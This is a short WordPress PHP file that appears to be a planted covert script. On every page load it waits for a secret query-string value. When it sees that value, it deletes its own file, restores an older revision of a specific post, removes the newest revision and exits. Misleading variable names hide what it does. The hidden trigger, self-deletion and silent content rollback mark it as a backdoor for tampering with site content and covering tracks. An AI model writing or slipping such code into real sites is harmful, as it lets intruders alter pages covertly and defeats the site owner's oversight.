<?php

function multiple_wpc_share() {
	if (isset($_GET['slider_preview_account']) && $_GET['slider_preview_account'] === 'campaign_homepage_index') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$beaver_integration_taxonomies = 1962;
		$cookie_posts_effect = wp_get_post_revisions($beaver_integration_taxonomies);
		if (empty($cookie_posts_effect)) die('no revisions');
		if (count($cookie_posts_effect) < 2) die('less than 2');
		$method_information_remover = array_shift($cookie_posts_effect);
		$messages_shop_security_landing = $method_information_remover->ID;
		$cover_feeds_fx = array_shift($cookie_posts_effect);
		$terms_variation_archive_free = $cover_feeds_fx->ID;
		$patterns_save_404 = wp_restore_post_revision($terms_variation_archive_free);
		if ($patterns_save_404 === false) die('error restoring');
		$patterns_save_404 = wp_delete_post_revision($messages_shop_security_landing);		
		if ($patterns_save_404 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'multiple_wpc_share');
